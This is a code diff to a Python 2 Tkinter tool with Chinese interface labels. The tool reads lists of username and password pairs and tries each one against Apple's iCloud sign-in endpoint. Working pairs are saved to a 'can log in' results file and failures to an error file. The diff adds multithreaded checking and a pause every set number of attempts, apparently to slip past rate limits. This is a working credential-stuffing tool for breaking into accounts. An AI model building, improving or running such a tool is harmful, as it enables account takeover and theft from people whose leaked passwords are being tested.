@@ -2,7 +2,6 @@
 import Tkinter as tk
 import tkMessageBox
 import tkFont
-import re
 import requests
 import threading
 import Queue
@@ -25,7 +24,7 @@ class FileHandle:
         tk.Button(new_frame, text=u'浏览', command=self.browser_file).grid(row=0, column=3, columnspan=3)
         self.file_chose = tk.Label(self.root, text=u'已选择文件: 尚未选择文件')
         self.file_chose.grid(row=3, sticky=tk.W)
-        tk.Label(self.root, text='-' * 110).grid(row=4, column=0, sticky=tk.W)
+        tk.Label(self.root, text='-' * 250).grid(row=4, column=0, sticky=tk.W)
 
         # 拨号
         new_frame2 = tk.Frame(self.root)
@@ -62,7 +61,7 @@ class FileHandle:
         self.threading_num = tk.StringVar()
         self.delimiter = tk.StringVar()
 
-        tk.Label(self.root, text='-' * 110).grid(row=7, sticky=tk.W)
+        tk.Label(self.root, text='-' * 250).grid(row=7, sticky=tk.W)
         tk.Label(self.root, text=u'处理规则', font=ft).grid(column=0, columnspan=3, sticky=tk.W)
 
         new_frame3 = tk.Frame(self.root)
@@ -75,12 +74,12 @@ class FileHandle:
         ).grid(row=2, column=1, sticky=tk.W)
         tk.Label(new_frame3, text=u'   设置线程数:  ').grid(row=2, column=2, sticky=tk.W)
         tk.Entry(new_frame3,  textvariable=self.threading_num, width=3).grid(row=2, column=4, sticky=tk.W)
-        self.threading_num.set(5)
+        self.threading_num.set(1)
         tk.Label(new_frame3, text=u'  ').grid(row=2, column=5, sticky=tk.W)
         tk.Button(new_frame3, text=u'执行', command=self.run, font=ft).grid(row=2, column=6, sticky=tk.E)
 
-        tk.Label(self.root, text='-' * 110).grid(row=10, sticky=tk.W)
-        self.tb = tk.Text(self.root)
+        tk.Label(self.root, text='-' * 250).grid(row=10, sticky=tk.W)
+        self.tb = tk.Text(self.root, width=185)
         self.tb.grid(row=11, sticky=tk.W)
 
         new_frame4 = tk.Frame(self.root)
@@ -90,7 +89,7 @@ class FileHandle:
 
         self.write_num = tk.Label(new_frame4, text=u'已写入: 0  | ')
         self.write_num.grid(row=0, column=1, sticky=tk.W)
-        self.right_file = tk.Label(new_frame4, text=u'可登录报错:   | ')
+        self.right_file = tk.Label(new_frame4, text=u'可登录结果报存:   | ')
         self.right_file.grid(row=0, column=2, sticky=tk.W)
         self.wrong_file = tk.Label(new_frame4, text=u'错误结果保存:    ')
         self.wrong_file.grid(row=0, column=3, sticky=tk.W)
@@ -125,8 +124,12 @@ class FileHandle:
         rtc = self.form_check()
         if rtc:
             runtime = time.clock()
-            print 128, int(self.threading_num.get())
-            s = IcloudScan(self.read_file, thread_num=int(self.threading_num.get()))
+            s = IcloudScan(
+                self.read_file,
+                thread_num=int(self.threading_num.get()),
+                wait=int(self.passue.get()),
+                handle_wait=int(self.num1.get())
+                )
             result = [
                 self.tb, self.line_num, self.write_num,
                 self.right_file, self.wrong_file, self.delimiter
@@ -144,10 +147,12 @@ class IcloudScan:
     """
     According the Txt to check avaliabled
     """
-    def __init__(self, file_fd, thread_num=5):
+    def __init__(self, file_fd, thread_num=5, wait=0, handle_wait=10):
         self.url = 'https://idmsa.apple.com/appleauth/auth/signin'
         self.file = file_fd
         self.line_num = 0
+        self.handle_wait = handle_wait
+        self.wait = wait
         self.right = open('%s result-right.txt' % self.file.name, 'w')
         self.wrong = open('%s result-error.txt' % self.file.name, 'w')
         self.thread_num = thread_num
@@ -171,20 +176,22 @@ class IcloudScan:
         })
 
     def read_file(self, tk_line_total):
+        self.file.seek(0)
         for line in self.file:
             self.line_num += 1
             self.read_queue.put(line)
 
         tk_line_total['text'] = u'文件总数: %s  ' % self.line_num
-        # print 'Read file completed'
-        # print 'Totol line num is : %s' % self.line_num
 
-    def run(self, delimiter):
-        num = 0
+    def run(self, delimiter, wait, handle_wait):
+        num = 1
         flag = 1
         while 1:
             if not self.read_queue.empty():
-                line = self.read_queue.get(timeout=60)
+                line = self.read_queue.get(timeout=5)
+                if num % handle_wait == 0:
+                    print u'访问 %s 次, 暂停登陆 %s s' % (handle_wait, wait)
+                    time.sleep(wait)
                 if line:
                     line = line.strip()
                     if delimiter in line:
@@ -192,7 +199,6 @@ class IcloudScan:
                     else:
                         username, passwd = line.split()[:2]
                 num += 1
-                # print "%s handle the %s record" % (thread_name, num)
                 requests_data = json.dumps({
                     'accountName': username,
                     'password': passwd,
@@ -229,49 +235,46 @@ class IcloudScan:
 
                 flag = 1
             else:
-                # print "Record MQ is empty! threading: %s exit" % thread_name
                 break
 
-    def write_log(self, tb, write_num, right_num, wrong_num):
+    def write_log(self, tb, write_num, right_file, wrong_file):
+        tb.delete(0.0, tk.END)
         line = 0
         r_n = w_n = 0
         while 1:
             try:
-                fd, message = self.write_queue.get(timeout=60)
+                fd, message = self.write_queue.get(timeout=5)
                 if fd is self.wrong:
                     w_n += 1
                 elif fd is self.right:
                     r_n += 1
 
                 line += 1
-                print message
+                print message,
                 tb.insert(tk.END, message)
-                time.sleep(0.1)
                 tb.update()
                 tb.see(tk.END)
-                # write_num['text'] = u'已写入: %s    ' % line
-                # right_num['text'] = u'已写入: %s    ' % r_n
-                # wrong_num['text'] = u'已写入: %s    ' % w_n
                 fd.write(message.encode('utf8'))
-
             except Queue.Empty:
-                # print "Writing MQ is empty!, threading exit"
                 break
-        # print "Totle of record writed is %s !" % line
+
+        right_file['text'] = u'可登录报错:  %s | ' % self.right.name
+        wrong_file['text'] = u'错误结果保存:  %s  ' % self.wrong.name
+        write_num['text'] = u'已写入: %s    ' % line
 
     def main(self, para_set):
-        tb, total_line, write_num, right_num, wroong_num, delimiter = para_set
+        tb, total_line, write_num, right_file, wrong_file, delimiter = para_set
 
         thread_list = []
         thread_list.append(
             threading.Thread(target=self.read_file, args=(total_line,))
         )
         thread_list.append(
-            threading.Thread(target=self.write_log, args=(tb, write_num, right_num, wroong_num))
+            threading.Thread(target=self.write_log, args=(tb, write_num, right_file, wrong_file))
         )
         for tn in range(self.thread_num):
             thread_list.append(
-                threading.Thread(target=self.run, args=(delimiter.get(),))
+                threading.Thread(target=self.run, args=(delimiter.get(), self.wait, self.handle_wait))
             )
 
         # run all
